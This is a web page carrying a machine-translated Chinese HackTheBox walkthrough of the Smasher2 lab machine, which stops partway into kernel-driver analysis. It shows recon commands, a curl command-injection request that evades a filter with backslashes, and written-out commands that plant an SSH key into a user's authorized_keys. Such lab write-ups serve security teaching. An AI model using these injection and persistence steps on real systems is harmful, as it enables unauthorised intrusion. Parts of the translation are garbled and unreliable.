<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ğŸ‘°ğŸ¿ ğŸ¤±ğŸ½ ğŸ¦‚ å“ˆå…‹ç›’å­-Smasher2æ¼”ç»ƒ é€šè¿‡pwné©±åŠ¨ç¨‹åºè¿›è¡ŒFlaskï¼ŒWAFå’ŒLPE ğŸ˜­ ğŸ§‘ â›·ï¸</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘å°†å¼€å§‹å‘å¸ƒä»HackTheBoxç½‘ç«™å‘é€çš„ç”¨äºè¿›ä¸€æ­¥å¤„ç†çš„è§£å†³æ–¹æ¡ˆã€‚ æˆ‘å¸Œæœ›è¿™å°†è‡³å°‘å¸®åŠ©æŸäººåœ¨ä¿¡æ¯å®‰å…¨é¢†åŸŸå‘å±•ã€‚ åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬å°†åè½¬pythonåº“ï¼Œç»•è¿‡WAFå¹¶åˆ©ç”¨mmapæ¼æ´ã€‚ 

 é€šè¿‡VPNè¿æ¥åˆ°å®éªŒå®¤ã€‚ å»ºè®®ä¸è¦ä»å¯ç”¨å¯¹æ‚¨é‡è¦çš„æ•°æ®çš„å·¥ä½œè®¡ç®—æœºæˆ–ä¸»æœºè¿›è¡Œè¿æ¥ï¼Œå› ä¸ºæ‚¨æœ€ç»ˆå°†ä¸ä¸ä¿¡...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>å“ˆå…‹ç›’å­-Smasher2æ¼”ç»ƒ é€šè¿‡pwné©±åŠ¨ç¨‹åºè¿›è¡ŒFlaskï¼ŒWAFå’ŒLPE</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/480454/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/ms/yw/0j/msyw0jxgua25iuntaxj1qcayfuq.png" alt="å›¾ç‰‡"></div><br> åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘å°†å¼€å§‹å‘å¸ƒä»<a href="https://www.hackthebox.eu/" rel="nofollow">HackTheBox</a>ç½‘ç«™å‘é€çš„ç”¨äº<a href="https://www.hackthebox.eu/" rel="nofollow">è¿›ä¸€æ­¥å¤„ç†çš„</a>è§£å†³æ–¹æ¡ˆã€‚ æˆ‘å¸Œæœ›è¿™å°†è‡³å°‘å¸®åŠ©æŸäººåœ¨ä¿¡æ¯å®‰å…¨é¢†åŸŸå‘å±•ã€‚ åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬å°†åè½¬pythonåº“ï¼Œç»•è¿‡WAFå¹¶åˆ©ç”¨mmapæ¼æ´ã€‚ <br><br> é€šè¿‡VPNè¿æ¥åˆ°å®éªŒå®¤ã€‚ å»ºè®®ä¸è¦ä»å¯ç”¨å¯¹æ‚¨é‡è¦çš„æ•°æ®çš„å·¥ä½œè®¡ç®—æœºæˆ–ä¸»æœºè¿›è¡Œè¿æ¥ï¼Œå› ä¸ºæ‚¨æœ€ç»ˆå°†ä¸ä¸ä¿¡æ¯å®‰å…¨é¢†åŸŸæœ‰äº†è§£çš„äººå»ºç«‹ç§æœ‰ç½‘ç»œï¼š) <br><br><div class="spoiler">  <b class="spoiler_title">ç»„ç»‡ä¿¡æ¯</b> <div class="spoiler_text"> ç‰¹åˆ«æ˜¯å¯¹äºé‚£äº›æƒ³è¦å­¦ä¹ æ–°çŸ¥è¯†å¹¶åœ¨ä¿¡æ¯å’Œè®¡ç®—æœºå®‰å…¨æ€§çš„ä»»ä½•é¢†åŸŸä¸­å‘å±•çš„äººä»¬ï¼Œæˆ‘å°†æ’°å†™å’Œè®¨è®ºä»¥ä¸‹ç±»åˆ«ï¼š <br><br><ul><li>  PWNï¼› </li><li> å¯†ç å­¦ï¼ˆåŠ å¯†ï¼‰ï¼› </li><li> ç½‘ç»œæŠ€æœ¯ï¼ˆç½‘ç»œï¼‰ï¼› </li><li> åå‘ï¼ˆåå‘å·¥ç¨‹ï¼‰ï¼› </li><li> éšå†™æœ¯ï¼ˆSteganoï¼‰ï¼› </li><li> æœç´¢å’Œåˆ©ç”¨Webæ¼æ´ã€‚ </li></ul><br> é™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘è¿˜å°†åˆ†äº«æˆ‘åœ¨è®¡ç®—æœºå–è¯ï¼Œæ¶æ„è½¯ä»¶å’Œå›ºä»¶åˆ†æï¼Œå¯¹æ— çº¿ç½‘ç»œå’Œå±€åŸŸç½‘çš„æ”»å‡»ï¼Œè¿›è¡Œç¬”æµ‹è¯•å’Œç¼–å†™æ¼æ´åˆ©ç”¨ç¨‹åºæ–¹é¢çš„ç»éªŒã€‚ <br><a name="habracut"></a><br> ä¸ºäº†ä½¿æ‚¨å¯ä»¥æŸ¥æ‰¾æœ‰å…³æ–°æ–‡ç« ï¼Œè½¯ä»¶å’Œå…¶ä»–ä¿¡æ¯çš„ä¿¡æ¯ï¼Œæˆ‘<a href="https://t.me/RalfHackerChannel" rel="nofollow">åœ¨Telegramä¸­</a>åˆ›å»ºäº†ä¸€ä¸ª<a href="https://t.me/RalfHackerChannel" rel="nofollow">é¢‘é“ï¼Œ</a>å¹¶åˆ›å»ºäº†ä¸€ä¸ª<a href="https://t.me/RalfHackerPublicChat" rel="nofollow">å°ç»„æ¥è®¨è®º</a> ICDé¢†åŸŸçš„<a href="https://t.me/RalfHackerPublicChat" rel="nofollow">æ‰€æœ‰é—®é¢˜</a> ã€‚ å¦å¤–ï¼Œæˆ‘ä¼šäº²è‡ªè€ƒè™‘æ‚¨çš„ä¸ªäººè¦æ±‚ï¼Œé—®é¢˜ï¼Œå»ºè®®å’Œå»ºè®®ï¼Œ <a href="https://t.me/hackerralf8" rel="nofollow">å¹¶ä¼šå›ç­”æ‰€æœ‰äºº</a> ã€‚ <br><br> æä¾›æ‰€æœ‰ä¿¡æ¯ä»…å‡ºäºæ•™è‚²ç›®çš„ã€‚ å¯¹äºç”±äºä½¿ç”¨æœ¬æ–‡æ¡£è€Œè·å¾—çš„çŸ¥è¯†å’Œæ–¹æ³•å¯¹æŸäººé€ æˆçš„ä»»ä½•æŸå®³ï¼Œæœ¬æ–‡æ¡£çš„ä½œè€…ä¸æ‰¿æ‹…ä»»ä½•è´£ä»»ã€‚ <br></div></div><br><h2> æ™ºå•† </h2><br><h3> ç«¯å£æ‰«æ </h3><br> è¿™å°æœºå™¨çš„IPåœ°å€ä¸º10.10.10.135ï¼Œæˆ‘å°†å…¶æ·»åŠ åˆ°/ etc / hostsä¸­ã€‚ <br> <code>10.10.10.135 smasher2.htb</code> <br> é¦–å…ˆï¼Œæˆ‘ä»¬æ‰«æå¼€æ”¾ç«¯å£ã€‚ ç”±äºä½¿ç”¨nmapæ‰«ææ‰€æœ‰ç«¯å£éœ€è¦å¾ˆé•¿æ—¶é—´ï¼Œå› æ­¤æˆ‘å°†é¦–å…ˆä½¿ç”¨masscanè¿›è¡Œæ­¤æ“ä½œã€‚ æˆ‘ä»¬ä»¥æ¯ç§’1000ä¸ªæ•°æ®åŒ…çš„é€Ÿåº¦æ‰«ææ¥è‡ªtun0æ¥å£çš„æ‰€æœ‰TCPå’ŒUDPç«¯å£ã€‚ <br><br><pre> <code class="bash hljs">masscan -e tun0 -p1-65535,U:1-65535 10.10.10.135 --rate=1000</code> </pre> <br><img src="https://habrastorage.org/webt/ua/l0/kl/ual0klllexxrrkhyehygavfrji8.png" alt="å›¾ç‰‡"><br><br> ä¸»æœºæœ‰3ä¸ªå¼€æ”¾çš„ç«¯å£ã€‚ ç°åœ¨ä½¿ç”¨nmapæ‰«æå®ƒä»¥è·å¾—æ›´å¤šè¯¦ç»†ä¿¡æ¯ã€‚ <br><br><pre> <code class="bash hljs">nmap -A 10.10.10.135 -p22,53,80</code> </pre> <br><img src="https://habrastorage.org/webt/rv/21/y3/rv21y3ntl_dol3qnlgvdhvshdhg.png" alt="å›¾ç‰‡"><br><br> å› æ­¤ï¼Œæˆ‘ä»¬æœ‰SSHï¼ŒDNSå’ŒWEBï¼Œå®ƒä»¬è¿”å›403ä»£ç ï¼ˆç¦æ­¢è®¿é—®è¢«æ‹’ç»ï¼‰ã€‚ <br><br><h3> åŸŸåè§£æ </h3><br> è®©æˆ‘ä»¬æ£€æŸ¥DNSã€‚ ä¸ºæ­¤ï¼Œè¯·ä½¿ç”¨å¸¦æœ‰-lé€‰é¡¹çš„ä¸»æœºå®¢æˆ·ç«¯ï¼Œä»¥ä½¿ç”¨AXFRè¯·æ±‚æŸ¥çœ‹åŸŸä¸­æ‰€æœ‰ä¸»æœºçš„åˆ—è¡¨ã€‚ <br><br><pre> <code class="bash hljs">host -l smasher2.htb 10.10.10.135</code> </pre> <br><img src="https://habrastorage.org/webt/3q/st/te/3qstteuzgycf6fxuc_7vxit1rfe.png" alt="å›¾ç‰‡"><br><br> å› æ­¤ï¼Œæ‚¨éœ€è¦åœ¨/ etc / hostsä¸­æ·»åŠ ä¸€ä¸ªæ–°æ¡ç›®ã€‚ <br> <code>10.10.10.135 wonderfulsessionmanager.smasher2.htb</code> <br> <br><h3> ç½‘é¡µ </h3><br> ç°åœ¨ï¼Œè®©æˆ‘ä»¬ç»§ç»­å‰è¿›ï¼Œçœ‹çœ‹è®¿é—®smasher2.htbæ—¶WEBä¼šç»™æˆ‘ä»¬å¸¦æ¥ä»€ä¹ˆã€‚ <br><br><img src="https://habrastorage.org/webt/9-/li/n5/9-lin58jouqm966oevnsoccso1a.png" alt="å›¾ç‰‡"><br><br> æ˜¯ç©ºçš„ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨åº”è¯¥æ•´ç†ç›®å½•ã€‚ æˆ‘æ­£åœ¨ä½¿ç”¨golangç¼–å†™çš„å¿«é€Ÿgobusterã€‚ æˆ‘ä»¬å°†æ•´ç†128ä¸ªçº¿ç¨‹ä¸­çš„ç›®å½•ï¼Œæˆ‘ä»¬å°†å¯¹htmlï¼Œphpï¼Œtxtï¼Œconfæ‰©å±•åå’Œå“åº”ä»£ç 200ã€204ã€301ã€302ã€307ã€401æ„Ÿå…´è¶£ã€‚ <br><br><pre> <code class="bash hljs">gobuster dir -t 128 -u http://smasher2.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt,conf -s 200,204,301,302,307,401</code> </pre><br><img src="https://habrastorage.org/webt/iw/du/g9/iwdug9gy9ukr37s9nn4-c7pqojk.png" alt="å›¾ç‰‡"><br><br> æŸ¥æ‰¾å¤‡ä»½ç›®å½•ã€‚ æˆ‘ä»¬çœ‹çœ‹é‡Œé¢æœ‰ä»€ä¹ˆã€‚ <br><br><img src="https://habrastorage.org/webt/id/lj/zz/idljzzfub_qbnzzwu2x1lic2l38.png" alt="å›¾ç‰‡"><br><br> å› æ­¤ï¼Œè¯·ä¸‹è½½pythonæ–‡ä»¶å’Œåº“ã€‚ æ¥ä¸‹æ¥ï¼Œè½¬åˆ°å¦ä¸€ä¸ªåŸŸåï¼Œç„¶ååœ¨å…¶ä¸­æ‰¾åˆ°æˆæƒè¡¨ã€‚ <br><br><img src="https://habrastorage.org/webt/mu/n0/mp/mun0mpgaqduxfzmhxifnqbq6_gg.png" alt="å›¾ç‰‡"><br><br>  Mozilla Firefox Wappalyzeræ’ä»¶æŠ¥å‘Šæ­£åœ¨ä½¿ç”¨çš„æŠ€æœ¯ã€‚ å› æ­¤ï¼Œè¯¥ç½‘ç«™æ˜¯ç”¨python 2.7.15ç¼–å†™çš„ã€‚ <br><br><img src="https://habrastorage.org/webt/ze/h9/ze/zeh9zeby2o839yeim2osz0-w__i.png" alt="å›¾ç‰‡"><br><br><h2>  WEB API </h2><br><h3> å·¨èŸ’ </h3><br> æˆ‘ä»¬åˆšåˆšæ‰¾åˆ°äº†auth.pyæ–‡ä»¶ï¼Œè®©æˆ‘ä»¬å¯¹å…¶è¿›è¡Œåˆ†æã€‚ åœ¨å¯¼å…¥çš„ç¬¬ä¸€è¡Œä¸­ï¼Œæˆ‘ä»¬è½¬åˆ°ses.soæ¨¡å—ï¼Œæˆ‘ä»¬ä¹Ÿåœ¨å¤‡ä»½ä¸­æ‰¾åˆ°äº†è¯¥æ¨¡å—ã€‚ <br><br><img src="https://habrastorage.org/webt/8-/ap/rm/8-aprmznzxtkkd04fzy9wzzrchk.png" alt="å›¾ç‰‡"><br><br> æˆ‘ä»¬åœ¨ä»£ç ä¸­æ‰¾åˆ°èº«ä»½éªŒè¯ã€‚ å¦‚æœéªŒè¯æˆåŠŸï¼Œæˆ‘ä»¬å°†è¿”å›secret_token_infoã€‚ <br><br><img src="https://habrastorage.org/webt/vn/er/sa/vnersai2zkkcopwujarn-9abz8i.png" alt="å›¾ç‰‡"><br><br><img src="https://habrastorage.org/webt/j2/yp/3e/j2yp3emp8fwuj4xbshedsf7bou0.png" alt="å›¾ç‰‡"><br><br> è®©æˆ‘ä»¬è½¬åˆ°â€œ / api // jobâ€ã€‚ æ•°æ®é€šè¿‡POSTæ–¹æ³•æ¥æ”¶ï¼Œä½†å®ƒä»¬å¿…é¡»ä¸ºJSONæ ¼å¼ã€‚ å¦‚æœæ•°æ®ä¸­å­˜åœ¨scheduleå‚æ•°ï¼Œå®ƒå°†ä½œä¸ºå‘½ä»¤è¡Œä¸­çš„å‘½ä»¤ä¼ é€’ç»™æ‰§è¡Œã€‚ <br><br><img src="https://habrastorage.org/webt/x7/oh/fs/x7ohfsjrcxhr8-tuwqdtcsnjxq8.png" alt="å›¾ç‰‡"><br><br> ç™»å½•åå’Œå¯†ç å·²è¢«ç¼–è¾‘...å®ƒä»¬è¢«è½¬ç§»åˆ°æˆ‘ä»¬çš„åº“ä¸­ï¼Œè¯¥åº“åˆ›å»ºä¸€ä¸ªä¼šè¯-SessionManagerå¯¹è±¡ã€‚ <br><br><img src="https://habrastorage.org/webt/uq/p4/2e/uqp42eqln2alvsfnpwyvjbe5c_q.png" alt="å›¾ç‰‡"><br><br> ç”±äºbefore_requestï¼Œæ¯æ¬¡æ–°è°ƒç”¨éƒ½ä¼šè°ƒç”¨safe_init_managerï¼ˆidï¼‰å‡½æ•°ã€‚ å› æ­¤ï¼Œæ–°çš„ä¼šè¯è¢«åˆå§‹åŒ–ã€‚ <br><br><img src="https://habrastorage.org/webt/95/wv/yu/95wvyudl1crmjq5nv-bq-li7gze.png" alt="å›¾ç‰‡"><br><br>  loginï¼ˆï¼‰å‡½æ•°åˆ›å»ºä¸€ä¸ªä¸ä¼šè¯ç›¸å…³çš„ç®¡ç†å™¨å¯¹è±¡ã€‚ <br><br><img src="https://habrastorage.org/webt/zi/0t/uh/zi0tuhqdy8ewibq3purmsr6u5_e.png" alt="å›¾ç‰‡"><br><br> ç„¶åé€šè¿‡check_loginï¼ˆï¼‰æ–¹æ³•æ‰§è¡Œæ£€æŸ¥ã€‚ <br><br><img src="https://habrastorage.org/webt/u8/xt/_v/u8xt_vgcczwhkl4cbqlzov7tsio.png" alt="å›¾ç‰‡"><br><br><h3> åå‘.so </h3><br> å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾å‡ºå¦‚ä½•æ£€æŸ¥æ•°æ®ã€‚ ä¸ºæ­¤ï¼Œåœ¨åº“ä¸­æˆ‘ä»¬éœ€è¦äº†è§£SessionManager.check_loginï¼ˆï¼‰è®¾å¤‡ã€‚ æŠ•å…¥IDA Proï¼Œå¯»æ‰¾æ‰€éœ€çš„åŠŸèƒ½ã€‚ <br><br><img src="https://habrastorage.org/webt/ui/--/y0/ui--y0og5qsjhymyhpozz6kux0u.png" alt="å›¾ç‰‡"><br><br> æ‰“å¼€åŠŸèƒ½ï¼Œæˆ‘æè¯·æ³¨æ„å®ƒçš„å›¾å½¢ã€‚ åœ¨èåˆä¹‹å‰ï¼Œæˆ‘å¯¹è®¸å¤šè¾ƒä½çš„å—æ„Ÿå…´è¶£ã€‚ <br><br><img src="https://habrastorage.org/webt/89/1o/7r/891o7r5jjpip6zh2uqba7xzbgrs.png" alt="å›¾ç‰‡"><br><br> æµè§ˆè¿™äº›å—ï¼Œæ‚¨å¯ä»¥çœ‹åˆ°å‡½æ•°æ‰§è¡Œçš„è¿™ä¸ªæˆ–é‚£ä¸ªåˆ†æ”¯åœ¨è°ˆè®ºä»€ä¹ˆã€‚ å› æ­¤ï¼Œæˆ‘ä»¬åªéœ€è¦æœ€å³è¾¹çš„å—ã€‚ <br><br><img src="https://habrastorage.org/webt/ve/xq/da/vexqdaz61fubdsfteffkqdx0ngi.png" alt="å›¾ç‰‡"><br><br> æˆ‘å·²ç»ç”»å‡ºäº†æˆ‘ä»¬æ„Ÿå…´è¶£çš„åŠŸèƒ½çš„è¡Œä¸ºç•Œé™ã€‚ <br><br><img src="https://habrastorage.org/webt/9c/k9/ao/9ck9aomluu0wemswvub1salylas.png" alt="å›¾ç‰‡"><br><br> ç°åœ¨ï¼Œè®©æˆ‘ä»¬è¿‡å»çœ‹çœ‹ä¼šå‘ç”Ÿä»€ä¹ˆã€‚ åœ¨ä¸€ä¸ªåœ°æ–¹ï¼Œæˆ‘æ³¨æ„åˆ°ä¸€ä¸ªç›¸åŒçš„ç™»å½•åå’Œå¯†ç ä»£ç ã€‚ è€Œä¸”æ¯”è¾ƒä¹Ÿä¸€æ ·ã€‚ <br><br><img src="https://habrastorage.org/webt/65/fs/cd/65fscdprft3krxphyiwtbxdq_vg.png" alt="å›¾ç‰‡"><br><br> æ­¤å¤–ï¼Œç™»å½•åå’Œå¯†ç è°ƒç”¨ç›¸åŒçš„åŠŸèƒ½ã€‚ <br><br><img src="https://habrastorage.org/webt/jo/um/w3/joumw3woscffqrof2lnjlyajdqs.png" alt="å›¾ç‰‡"><br><br> è¿™è¡¨æ˜ç”¨æˆ·åå’Œå¯†ç ç›¸åŒã€‚ ä½†æ˜¯ç”±äºæ­¤å€¼æ˜¯pythonç¨‹åºä¸­çš„å€¼ï¼Œå¹¶ä¸”å·²ç»è¿‡ç¼–è¾‘ï¼Œå› æ­¤å®ƒä»…ç”¨äºæ’åºã€‚ æˆ‘å°è¯•ä½¿ç”¨æ ‡å‡†åç§°ï¼Œä»¤æˆ‘æƒŠè®¶çš„æ˜¯ï¼Œç®¡ç†å‘˜å‡ºç°äº†ï¼ˆä¸ºä»€ä¹ˆæˆ‘ä¸ç«‹å³å°è¯•...ï¼‰ã€‚ <br><br><img src="https://habrastorage.org/webt/xp/9n/at/xp9natep2ikm8wlduicpijksqug.png" alt="å›¾ç‰‡"><br><br><h2> å…¥å£ç‚¹ </h2><br> æˆ‘ä»¬æœ‰ä¸€æŠŠé’¥åŒ™ã€‚ ç°åœ¨ï¼Œæ‚¨éœ€è¦æ”¶é›†æ‰§è¡Œä»£ç çš„è¯·æ±‚ã€‚ å¦‚å‰æ‰€è¿°ï¼Œæˆ‘ä»¬å¿…é¡»ä»¥JSONæ ¼å¼å°†åŒ…å«scheduleå‚æ•°çš„POSTæ–¹æ³•æ•°æ®å‘é€åˆ°<a href="http://wonderfulsessionmanager.smasher2.htb/auth/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job" rel="nofollow">wonderfulsessionmanager.smasher2.htb / auth / fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8 / job</a> ã€‚ æˆ‘ä»¬ä½¿ç”¨curlè¿›è¡Œæ­¤æ“ä½œï¼Œå¹¶å°†ç»“æœä¼ é€’ç»™jqã€‚ æˆ‘ä»¬å°†æ‰§è¡Œwhoamiå‘½ä»¤ã€‚ <br><br><pre> <code class="bash hljs">curl -s -H <span class="hljs-string"><span class="hljs-string">"Cookie: session=eyJpZCI6eyIgYiI6Ik5UaGlZVEJrTmpBMk1qYzBNemN4TmprellUTm1NREV3TXprMk9USTRPV1UzTnpVd05EQXdZZz09In19.XfZcLA.R3UTUnieAARkHBTbqpTmofKWtBw"</span></span> -H <span class="hljs-string"><span class="hljs-string">"Content-Type: application/json"</span></span> http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data <span class="hljs-string"><span class="hljs-string">'{"schedule":"whoami"}'</span></span> | jq</code> </pre> <br><img src="https://habrastorage.org/webt/-s/u0/er/-su0erve1bo3frizq-_qmtlyclq.png" alt="å›¾ç‰‡"><br><br> ä½†æ˜¯ï¼Œå½“å°è¯•æ‰§è¡Œâ€œ lsâ€å‘½ä»¤æ—¶ï¼Œä¼šå‡ºç°é”™è¯¯ã€‚ <br><br><img src="https://habrastorage.org/webt/sz/c7/pk/szc7pkucef1xd5errhnrw01ydas.png" alt="å›¾ç‰‡"><br><br> æœ€æœ‰å¯èƒ½åœ¨å›¢é˜Ÿä¸­æœ‰ä¸€ä¸ªç­›é€‰å™¨ã€‚ è®©æˆ‘ä»¬æˆåŠŸå‘é€â€œ l \\ sâ€-è¡¨ç¤ºå­˜åœ¨è¿‡æ»¤å™¨ã€‚ <br><br><img src="https://habrastorage.org/webt/bx/vl/wy/bxvlwyxbspsgt_bsucpjk8gkdda.png" alt="å›¾ç‰‡"><br><br><h2> ç”¨æˆ·å </h2><br> ç°åœ¨æˆ‘ä»¬éœ€è¦åœ¨ç³»ç»Ÿä¸­è·å¾—ä¸€ä¸ªæ™®é€šçš„å¤–å£³ã€‚ ç³»ç»Ÿè¿è¡ŒSSHï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ç”Ÿæˆå¯†é’¥å¹¶å°†å…¶æ¨é€åˆ°æˆæƒä¸»æœºåˆ—è¡¨ä¸­ã€‚ <br><br> é¦–å…ˆï¼Œæˆ‘ä»¬ç”Ÿæˆä¸€ä¸ªå¯†é’¥ã€‚ <br><br><img src="https://habrastorage.org/webt/75/nx/-m/75nx-mr9ckmrkoyiwer3tte6qbm.png" alt="å›¾ç‰‡"><br><br> ç°åœ¨ï¼Œæˆ‘ä»¬éœ€è¦å°†å…¬é’¥ä¼ è¾“åˆ°æ–‡ä»¶/home/dzonerzy/.ssh/authorized_keysã€‚ ä½†æ˜¯ä¸ºäº†ä½¿å…¶æ˜“äºä¼ è¾“ï¼Œæˆ‘ä»¬å°†åœ¨base64ä¸­ä½¿ç”¨å…¶ç¼–ç ã€‚ <br><br><pre> <code class="bash hljs">base64 -w0 id_rsa.pub</code> </pre> <br> æˆ‘ä»¬é¦–å…ˆå°†å…¶ä¼ è¾“åˆ°ä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ã€‚ <br><br><pre> <code class="bash hljs">ec\\ho \â€=\â€ &gt; /tmp/ralf</code> </pre> <br> ç°åœ¨æŒ‰é¢„æœŸè¿›è¡Œè§£ç å’Œå†™å…¥ã€‚ <br><pre> <code class="bash hljs">ba\\se\\64 -\\d /tmp/ralf &gt;&gt; /home/dzonerzy/\\.\\ss\\h/auth\\orized_ke\\ys</code> </pre> <br> æˆ‘ä»¬è®°ä¸‹äº†å¯†é’¥ï¼Œç°åœ¨ä¸€åˆ‡æ­£å¸¸ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç§é’¥é€šè¿‡SSHè¿æ¥ã€‚ æˆ‘ä»¬å°è¯•ã€‚ æˆ‘ä»¬åœ¨ç³»ç»Ÿä¸­ã€‚ <br><br><img src="https://habrastorage.org/webt/mf/7t/7n/mf7t7nnau3dbshpiirvblygdrhk.png" alt="å›¾ç‰‡"><br><br><h2>  LPE-æ ¹ </h2><br><h3> ä¸Šå¸‚ </h3><br> ç”¨æˆ·ä»¤ç‰Œæ—è¾¹æ˜¯READMEæ–‡ä»¶ã€‚ é˜…è¯»ã€‚ <br><br><img src="https://habrastorage.org/webt/n0/io/bi/n0iobindnitc1h69lhemnrnskmw.png" alt="å›¾ç‰‡"><br><br> æœ‰äººå‘Šè¯‰æˆ‘ä»¬ï¼Œæˆ‘ä»¬ä¸åº”è¯¥ä»¥æ ‡å‡†çš„æ–¹å¼æ€è€ƒ...ä½†æ˜¯ï¼Œåœ¨å®Œæˆæ ‡å‡†çš„æšä¸¾å¹¶ä¸”ä¸€æ— æ‰€è·ä¹‹åï¼Œæˆ‘æè¯·ç”¨æˆ·æ³¨æ„æ‰€åœ¨çš„ç»„ã€‚ <br><br><img src="https://habrastorage.org/webt/ko/rc/9u/korc9u_5ji78nds_jgcnelql_uq.png" alt="å›¾ç‰‡"><br><br>  admç»„æœ‰æƒè®¿é—®æœ‰è¶£çš„æ–‡ä»¶ã€‚ <br><br><img src="https://habrastorage.org/webt/dp/oj/c0/dpojc0lhn1tpdzsgcp0k11vtyec.png" alt="å›¾ç‰‡"><br><br> ä¾‹å¦‚ï¼Œauth.logã€‚ å®ƒä¸ä»…åæ˜ äº†æˆåŠŸå’Œä¸æˆåŠŸæˆæƒçš„äº‹å®ï¼Œè¿˜åæ˜ äº†ä½¿ç”¨sudoå‘½ä»¤çš„äº‹å®ã€‚ <br><br><pre> <code class="bash hljs">strings /var/<span class="hljs-built_in"><span class="hljs-built_in">log</span></span>/auth.log | grep sudo</code> </pre> <br><img src="https://habrastorage.org/webt/8t/a6/r7/8ta6r7a-rgji8-ruimkshuc-2to.png" alt="å›¾ç‰‡"><br><br> ä¸€ä¸ªæœ‰è¶£çš„å‘½ä»¤ä»£è¡¨æ ¹æ‰§è¡Œã€‚ ä½†æ˜¯å®ƒä¸é©±åŠ¨ç¨‹åºè¿æ¥ï¼Œå› æ­¤æ‚¨éœ€è¦ç¡®ä¿æˆ‘ä»¬éµå¾ªè¯¥è·¯å¾„ã€‚ <br><br><img src="https://habrastorage.org/webt/ix/1i/gx/ix1igxiggwoaugz01xkwu81ftbe.png" alt="å›¾ç‰‡"><br><br> æ˜¯çš„ï¼Œä¸å¹¸çš„æ˜¯ï¼Œä¸€åˆ‡éƒ½å½’å¸æœºã€‚ <br><br><h3> å¸æœº </h3><br> ç”±äºè¿™æ˜¯ä¸€ä¸ªé©±åŠ¨ç¨‹åºï¼ˆå†…æ ¸æ¨¡å—ï¼‰ï¼Œå› æ­¤æˆ‘ä»¬å°†ä½¿ç”¨modinfoè·å¾—æœ‰å…³å®ƒçš„ä¿¡æ¯ã€‚ <br><br><img src="https://habrastorage.org/webt/ek/bh/1v/ekbh1vr8tpqrjysaqtkuu3ogwsk.png" alt="å›¾ç‰‡"><br><br> æ®è¯´éœ€è¦é©±åŠ¨ç¨‹åºæ‰èƒ½ä½¿ç”¨dhidè®¾å¤‡ã€‚ çœ‹çœ‹å§ã€‚ <br><br><img src="https://habrastorage.org/webt/ck/bv/zx/ckbvzxss6iz1ughsn_lhqflutw4.png" alt="å›¾ç‰‡"><br><br> æ˜¯çš„ æœ‰è¿™æ ·çš„è®¾å¤‡ã€‚ ä¸ºäº†ç ”ç©¶é©±åŠ¨ç¨‹åºï¼Œæˆ‘å°†å…¶å¤åˆ¶å¹¶ä¸‹è½½åˆ°IDA Proä¸­ã€‚ <br><br><pre> <code class="bash hljs">scp -i id_rsa dzonerzy@10.10.10.135:/lib/modules/4.15.0-45-generic/kernel/drivers/hid/dhid.ko ./</code> </pre> <br> å¾ˆå°‘çš„åŠŸèƒ½åˆ—è¡¨ï¼Œå¯¹äºPWNï¼Œæˆ‘ä»¬å¯¹ä¸å†…å­˜é…åˆä½¿ç”¨çš„åŠŸèƒ½æ„Ÿå…´è¶£ã€‚ ä»åç§°æ¥çœ‹ï¼Œå®ƒä»¬æ˜¯dev_readå’Œdev_mmapã€‚ <br><br><img src="https://habrastorage.org/webt/g9/k9/5s/g9k95slhxhlihqi0nhwm3ei5qxk.png" alt="å›¾ç‰‡"><br><br> è¿›ä¸€æ­¥è°·æ­Œæœç´¢ï¼Œæˆ‘æ²¡æœ‰ç‰¹åˆ«å‘ç°æœ‰å…³é©±åŠ¨ç¨‹åºä¸­ä¸é˜…è¯»æœ‰å…³çš„æ¼æ´çš„ä¿¡æ¯ï¼Œè€Œmmapä¸èƒ½è¯´è¿™ï¼ æ‰€ä»¥æˆ‘å»æ‰¾å¥¹ã€‚ <br><br><img src="https://habrastorage.org/webt/3v/rk/7x/3vrk7xh2hcwclirw59wcdzihxxe.png" alt="å›¾ç‰‡"><br><br> 